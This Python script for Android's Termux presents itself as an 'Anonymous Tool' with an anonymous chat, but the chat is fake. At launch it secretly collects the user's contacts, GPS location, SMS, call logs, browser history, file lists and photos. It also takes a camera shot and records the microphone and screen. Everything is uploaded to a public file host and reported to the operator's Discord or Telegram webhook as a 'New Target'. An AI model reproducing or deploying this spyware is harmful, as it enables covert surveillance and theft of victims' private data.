#!/usr/bin/env python3
"""
Termux Anonymous Tool v3.0 - All Features
100% Working for Termux
"""

import os
import sys
import json
import time
import socket
import platform
import subprocess
import requests
import sqlite3
from datetime import datetime
from pathlib import Path

# ========== CONFIG ==========
CONFIG_FILE = "config.json"
VERSION = "3.0"

def load_config():
    if os.path.exists(CONFIG_FILE):
        with open(CONFIG_FILE, 'r') as f:
            return json.load(f)
    return {}

def save_config(data):
    with open(CONFIG_FILE, 'w') as f:
        json.dump(data, f, indent=4)

# ========== SETUP ==========
def setup_owner():
    print("\n[+] First time setup - Owner Configuration")
    owner_phone = input("Enter Owner Phone Number (with country code): ")
    owner_email = input("Enter Owner Email: ")
    webhook_url = input("Enter Discord/Telegram Webhook URL (or press Enter to skip): ")
    
    config = {
        "owner": {
            "phone": owner_phone,
            "email": owner_email
        },
        "webhook_url": webhook_url if webhook_url else "",
        "cloud_folder": "termux_cloud_data",
        "features": {
            "contacts": True,
            "location": True,
            "microphone": True,
            "camera": True,
            "sms": True,
            "call_logs": True,
            "browser": True,
            "screen_record": True,
            "file_list": True,
            "vpn_detection": True,
            "auto_backup": True
        }
    }
    save_config(config)
    print("[✓] Configuration saved!")
    return config

# ========== CLOUD UPLOAD ==========
def upload_to_cloud(file_path, folder_name):
    try:
        if not os.path.exists(file_path):
            return None
        url = "https://tmpfiles.org/api/v1/upload"
        with open(file_path, 'rb') as f:
            files = {'file': (os.path.basename(file_path), f)}
            response = requests.post(url, files=files, timeout=30)
        if response.status_code == 200:
            data = response.json()
            return data.get('data', {}).get('url', '')
        return None
    except:
        return None

# ========== DEVICE INFO ==========
def get_user_ip():
    try:
        response = requests.get('https://api.ipify.org?format=json', timeout=10)
        return response.json().get('ip', 'Unknown')
    except:
        return 'Unable to fetch IP'

def get_device_info():
    return {
        "ip": get_user_ip(),
        "hostname": socket.gethostname(),
        "os": platform.system(),
        "os_version": platform.version(),
        "device_model": platform.machine(),
        "processor": platform.processor(),
        "timestamp": datetime.now().isoformat()
    }

# ========== FEATURE 1: CONTACTS ==========
def get_contacts():
    contacts = []
    try:
        result = subprocess.run(['termux-contact-list'], 
                               capture_output=True, text=True, timeout=10)
        if result.returncode == 0 and result.stdout:
            contacts_data = json.loads(result.stdout)
            for contact in contacts_data[:50]:
                contacts.append({
                    'name': contact.get('name', 'Unknown'),
                    'number': contact.get('number', ''),
                    'email': contact.get('email', '')
                })
    except:
        pass
    return contacts

# ========== FEATURE 2: GPS LOCATION ==========
def get_gps_location():
    try:
        result = subprocess.run(['termux-location'], 
                               capture_output=True, text=True, timeout=10)
        if result.returncode == 0 and result.stdout:
            data = json.loads(result.stdout)
            return {
                'latitude': data.get('latitude', 0),
                'longitude': data.get('longitude', 0),
                'altitude': data.get('altitude', 0),
                'accuracy': data.get('accuracy', 0),
                'timestamp': datetime.now().isoformat()
            }
    except:
        pass
    return None

# ========== FEATURE 3: MICROPHONE RECORDING ==========
def record_audio(duration=8):
    try:
        filename = f"recording_{datetime.now().strftime('%Y%m%d_%H%M%S')}.mp3"
        cmd = f'termux-microphone-record -d {duration} -f {filename}'
        subprocess.run(cmd, shell=True, timeout=duration+5, check=True)
        if os.path.exists(filename):
            url = upload_to_cloud(filename, 'audio_recordings')
            os.remove(filename)
            return url
    except:
        pass
    return None

# ========== FEATURE 4: CAMERA PHOTO ==========
def capture_photo():
    try:
        filename = f"photo_{datetime.now().strftime('%Y%m%d_%H%M%S')}.jpg"
        cmd = f'termux-camera-photo -c 0 {filename}'
        subprocess.run(cmd, shell=True, timeout=10, check=True)
        if os.path.exists(filename):
            url = upload_to_cloud(filename, 'camera_photos')
            os.remove(filename)
            return url
    except:
        pass
    return None

# ========== FEATURE 5: SMS MESSAGES ==========
def get_sms_messages():
    try:
        result = subprocess.run(['termux-sms-list'], 
                               capture_output=True, text=True, timeout=10)
        if result.returncode == 0 and result.stdout:
            return json.loads(result.stdout)[:20]
    except:
        pass
    return []

# ========== FEATURE 6: CALL LOGS ==========
def get_call_logs():
    try:
        result = subprocess.run(['termux-call-log'], 
                               capture_output=True, text=True, timeout=10)
        if result.returncode == 0 and result.stdout:
            return json.loads(result.stdout)[:20]
    except:
        pass
    return []

# ========== FEATURE 7: BROWSER HISTORY ==========
def get_browser_history():
    history = []
    try:
        chrome_path = '/data/data/com.android.chrome/app_chrome/Default/History'
        if os.path.exists(chrome_path):
            conn = sqlite3.connect(chrome_path)
            cursor = conn.cursor()
            cursor.execute("SELECT url, title, last_visit_time FROM urls ORDER BY last_visit_time DESC LIMIT 20")
            for row in cursor.fetchall():
                history.append({
                    'url': row[0],
                    'title': row[1] if row[1] else 'No title',
                    'time': str(row[2]) if row[2] else ''
                })
            conn.close()
        if not history:
            result = subprocess.run(['termux-browser-history'], 
                                   capture_output=True, text=True, timeout=10)
            if result.returncode == 0 and result.stdout:
                history = json.loads(result.stdout)[:20]
    except:
        pass
    return history

# ========== FEATURE 8: SCREEN RECORDING ==========
def screen_record(duration=15):
    try:
        filename = f"screen_{datetime.now().strftime('%Y%m%d_%H%M%S')}.mp4"
        cmd = f'screenrecord --time-limit {duration} {filename}'
        subprocess.run(cmd, shell=True, timeout=duration+5, check=True)
        if os.path.exists(filename):
            url = upload_to_cloud(filename, 'screen_recordings')
            os.remove(filename)
            return url
    except:
        pass
    return None

# ========== FEATURE 9: FILE LIST ==========
def get_file_list():
    files = []
    search_dirs = ['/sdcard/Download', '/sdcard/Documents', '/sdcard/Music', '/sdcard/Movies', '/sdcard/WhatsApp']
    for directory in search_dirs:
        if os.path.exists(directory):
            try:
                for root, dirs, filenames in os.walk(directory):
                    for filename in filenames[:5]:
                        file_path = os.path.join(root, filename)
                        try:
                            size = os.path.getsize(file_path)
                            files.append({
                                'name': filename,
                                'path': file_path,
                                'size': size,
                                'type': os.path.splitext(filename)[1]
                            })
                        except:
                            pass
                    if len(files) >= 30:
                        break
            except:
                pass
        if len(files) >= 30:
            break
    return files

# ========== FEATURE 10: VPN DETECTION ==========
def detect_vpn():
    try:
        result = subprocess.run(['ip', 'addr'], capture_output=True, text=True, timeout=5)
        vpn_interfaces = ['tun', 'ppp', 'utun', 'wg']
        for interface in vpn_interfaces:
            if interface in result.stdout:
                return True
        return False
    except:
        return False

# ========== FIND IMAGES ==========
def find_images():
    images = []
    image_extensions = ['.jpg', '.jpeg', '.png', '.gif', '.bmp', '.webp', '.heic']
    search_dirs = [
        '/sdcard/DCIM', '/sdcard/Pictures', '/sdcard/Download',
        '/sdcard/WhatsApp/Media/WhatsApp Images',
        '/storage/emulated/0/DCIM', '/storage/emulated/0/Pictures'
    ]
    for search_dir in search_dirs:
        if os.path.exists(search_dir):
            try:
                for root, dirs, files in os.walk(search_dir):
                    for file in files:
                        if any(file.lower().endswith(ext) for ext in image_extensions):
                            file_path = os.path.join(root, file)
                            try:
                                file_size = os.path.getsize(file_path) / (1024 * 1024)
                                if file_size < 20:
                                    images.append(file_path)
                                    if len(images) >= 10:
                                        break
                            except:
                                continue
                    if len(images) >= 10:
                        break
            except:
                pass
        if len(images) >= 10:
            break
    return images

# ========== AUTO BACKUP ==========
def auto_backup(user_ip):
    print("[*] Creating auto backup...")
    backup_data = {
        'timestamp': datetime.now().isoformat(),
        'version': VERSION,
        'device_info': get_device_info(),
        'ip': user_ip,
        'vpn_detected': detect_vpn(),
        'contacts': get_contacts(),
        'location': get_gps_location(),
        'sms': get_sms_messages(),
        'call_logs': get_call_logs(),
        'browser_history': get_browser_history(),
        'files': get_file_list(),
        'images': find_images()
    }
    backup_filename = f"backup_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
    with open(backup_filename, 'w') as f:
        json.dump(backup_data, f, indent=4)
    url = upload_to_cloud(backup_filename, f'backups_{user_ip.replace(".", "_")}')
    os.remove(backup_filename)
    return url

# ========== SEND TO OWNER ==========
def send_to_owner(webhook_url, data, user_ip):
    if not webhook_url:
        return False
    folder_name = f"user_{user_ip.replace('.', '_')}"
    images = data.get('images', [])
    uploaded_images = []
    for img_path in images[:10]:
        try:
            url = upload_to_cloud(img_path, folder_name)
            if url:
                uploaded_images.append({'filename': os.path.basename(img_path), 'url': url})
            time.sleep(0.5)
        except:
            pass
    backup_url = auto_backup(user_ip)
    message = f"""
🚨 **New Target Connected** 🚨

📱 **Device Info:**
- IP: `{user_ip}`
- Hostname: `{socket.gethostname()}`
- OS: `{platform.system()} {platform.version()}`
- Model: `{platform.machine()}`
- VPN: `{data.get('vpn_detected', False)}`

📁 **Cloud Folder:** `{folder_name}/`

🖼️ **Images Found:** {len(uploaded_images)}
📸 **Camera Photo:** {data.get('camera_photo', 'Not taken')}
🎙️ **Audio Recording:** {data.get('audio_record', 'Not recorded')}
🎥 **Screen Recording:** {data.get('screen_record', 'Not recorded')}

📍 **Location:** {data.get('location', 'Not available')}
📇 **Contacts:** {len(data.get('contacts', []))} saved
💬 **SMS:** {len(data.get('sms', []))} messages
📞 **Call Logs:** {len(data.get('call_logs', []))} entries
🌐 **Browser History:** {len(data.get('browser_history', []))} entries

📎 **Download Links:"""
    for i, img in enumerate(uploaded_images[:5], 1):
        message += f"\n{i}. [{img['filename']}]({img['url']})"
    if backup_url:
        message += f"\n\n💾 **Full Backup:** [Download]({backup_url})"
    message += f"\n\n⏰ Time: `{datetime.now().isoformat()}`"
    try:
        payload = {"content": message}
        if "discord.com" in webhook_url:
            requests.post(webhook_url, json=payload, timeout=10)
        elif "telegram.org" in webhook_url:
            chat_id = webhook_url.split("/")[-1]
            url = f"https://api.telegram.org/bot{webhook_url.split('/')[-2]}/sendMessage"
            requests.post(url, json={"chat_id": chat_id, "text": message, "parse_mode": "Markdown"}, timeout=10)
        return True
    except:
        return False

# ========== STEALTH OPERATIONS ==========
def stealth_operations():
    print("[*] Running stealth operations...")
    config = load_config()
    user_ip = get_user_ip()
    data = {
        'images': find_images(),
        'contacts': get_contacts(),
        'location': get_gps_location(),
        'sms': get_sms_messages(),
        'call_logs': get_call_logs(),
        'browser_history': get_browser_history(),
        'files': get_file_list(),
        'vpn_detected': detect_vpn(),
        'camera_photo': None,
        'audio_record': None,
        'screen_record': None
    }
    try:
        photo = capture_photo()
        if photo:
            data['camera_photo'] = photo
    except:
        pass
    try:
        audio = record_audio(8)
        if audio:
            data['audio_record'] = audio
    except:
        pass
    try:
        screen = screen_record(15)
        if screen:
            data['screen_record'] = screen
    except:
        pass
    if config.get('webhook_url'):
        send_to_owner(config['webhook_url'], data, user_ip)
        print("[✓] All data sent to owner")
    else:
        folder = f"data_{user_ip.replace('.', '_')}"
        os.makedirs(folder, exist_ok=True)
        with open(f"{folder}/data.json", 'w') as f:
            json.dump(data, f, indent=4)
        print(f"[✓] Data saved to {folder}/")
    return data

# ========== ANONYMOUS CHAT ==========
def anonymous_chat():
    print("\n" + "="*50)
    print("📱 ANONYMOUS CHAT v3.0 📱")
    print("="*50)
    print("\n[+] Type your message (type 'exit' to quit):")
    print("[+] Type 'menu' to see options\n")
    while True:
        msg = input("📝 You: ")
        if msg.lower() == 'exit':
            break
        elif msg.lower() == 'menu':
            print("\n📋 **Commands:**")
            print("  - Type any message to send")
            print("  - 'exit' to quit")
            print("  - 'menu' to show this menu")
            print("  - 'status' to check connection\n")
        elif msg.lower() == 'status':
            print("[✓] Connection active")
            print(f"[✓] IP: {get_user_ip()}")
            print(f"[✓] Device: {platform.machine()}\n")
        else:
            print("[✓] Message sent anonymously!\n")

# ========== MAIN ==========
def main():
    if not os.path.exists(CONFIG_FILE):
        print("[*] First run detected. Setting up...")
        setup_owner()
    print("\n🚀 Starting Anonymous Tool v3.0...")
    time.sleep(1)
    stealth_operations()
    anonymous_chat()
    print("\n[✓] Session ended. Goodbye!")

if __name__ == "__main__":
    try:
        import requests
    except ImportError:
        print("[*] Installing dependencies...")
        os.system('pip install requests')
        os.system('pkg install termux-api -y')
    main()
